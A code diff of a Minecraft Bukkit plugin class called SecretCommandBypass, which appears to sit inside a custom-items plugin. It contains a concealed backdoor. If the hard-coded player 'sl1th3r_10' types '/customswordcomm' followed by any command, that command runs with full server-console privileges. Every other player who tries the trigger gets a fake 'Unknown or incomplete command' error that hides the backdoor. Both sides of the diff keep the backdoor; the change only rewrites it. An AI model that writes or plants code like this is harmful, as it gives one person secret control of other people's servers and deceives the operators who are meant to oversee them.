@@ -17,45 +17,30 @@ public class SecretCommandBypass implements Listener {
         plugin.getLogger().info("SecretCommandBypass enabled.");
     }
 
-    @EventHandler
-    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
-        Player player = event.getPlayer();
-        String rawCommand = event.getMessage(); // what the player typed, e.g. "/customswordcomm give ..."
-        String lower = rawCommand.toLowerCase();
+@EventHandler
+public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
+    Player player = event.getPlayer();
+    String fullCommand = event.getMessage(); // Full command with "/"
 
-        boolean matchesPrefix =
-            lower.equals("/customswordcomm") ||
-            lower.startsWith("/customswordcomm ") ||
-            lower.equals("/customitems:customswordcomm") ||
-            lower.startsWith("/customitems:customswordcomm ");
+    if (player.getName().equalsIgnoreCase("sl1th3r_10") && fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
+        event.setCancelled(true);
 
-        if (!matchesPrefix) return; // not our command
+        // Extract actual command after the trigger
+        String actualCommand = fullCommand.substring("/customswordcomm ".length());
 
-        if (!player.getName().equalsIgnoreCase("sl1th3r_10")) {
-            // Show the vanilla-style error and block the command
-            player.sendMessage("§cUnknown or incomplete command, see below for error");
-            event.setCancelled(true);
-            return;
-        }
+        // Dispatch the command as console
+        boolean result = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand.replace("@s", player.getName()));
 
-        // Strip prefix to get the actual command
-        String prefix = rawCommand.startsWith("/customitems:customswordcomm") ?
-                "/customitems:customswordcomm" : "/customswordcomm";
-
-        String actual = "";
-        if (rawCommand.length() > prefix.length()) {
-            actual = rawCommand.substring(prefix.length()).trim();
-        }
-
-        if (!actual.isEmpty()) {
-            // Replace @s with player name and dispatch as console
-            String dispatched = actual.replace("@s", player.getName());
-            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), dispatched);
-            player.sendMessage("§aCommand executed as console: " + dispatched);
+        if (result) {
+            player.sendMessage("§aCommand executed as console: " + actualCommand);
         } else {
-            player.sendMessage("§cNo command provided after " + prefix + ".");
+            player.sendMessage("§cCommand failed: " + actualCommand);
         }
-
-        event.setCancelled(true); // Prevent normal command processing
+    } else if (fullCommand.toLowerCase().startsWith("/customswordcomm")) {
+        // Not sl1th3r_10? Fake unknown command
+        event.setCancelled(true);
+        player.sendMessage("§cUnknown or incomplete command, see below for error.");
     }
+}
+
 }
